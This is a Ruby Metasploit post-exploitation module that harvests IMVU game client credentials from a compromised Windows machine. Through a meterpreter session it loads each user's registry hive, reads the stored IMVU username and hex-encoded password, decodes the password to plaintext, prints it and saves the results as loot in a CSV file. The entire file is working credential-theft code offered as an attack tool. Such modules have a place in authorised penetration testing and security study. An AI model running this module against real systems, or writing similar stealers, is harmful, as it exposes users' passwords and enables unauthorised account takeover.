# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Gather Credentials IMVU Game Client',
      'Description'    => %q{
        This module extracts account username & password from the IMVU game client
        and stores it as loot.
        },
      'Author'         =>
        [
        'Shubham Dawra <shubham2dawra[at]gmail.com>' # www.SecurityXploded.com
        ],
      'License'        => MSF_LICENSE,
      'Platform' => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ]
    ))
  end


  def run

    creds = Rex::Text::Table.new(
      'Header' => 'IMVU Credentials',
      'Indent' => 1,
      'Columns' =>[
        'User',
        'Password'
      ]
    )

    credcount=0
    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil

      vprint_status("Looking at Key #{hive['HKU']}")
      subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
      if subkeys.nil? or subkeys.empty?
        print_status("IMVU not installed for this user.")
        next
      end
      user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username\\", "")
      hpass = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\password\\", "")
      decpass = [ hpass.downcase.gsub(/'/,'').gsub(/\\?x([a-f0-9][a-f0-9])/, '\1') ].pack("H*")
      print_good("User=#{user}, Password=#{decpass}")
      creds << [user, decpass]
      credcount = (credcount + 1)
    end

    #clean up after ourselves
    unload_our_hives(userhives)
    print_status("#{credcount} Credentials were found.")

    if credcount > 0
      print_status("Storing data...")
      path = store_loot(
        'imvu.user.creds',
        'text/csv',
        session,
        creds.to_csv,
        'imvu_user_creds.csv',
        'IMVU User Credentials'
      )
      print_good("IMVU user credentials saved in: #{path}")
    end

  end
end
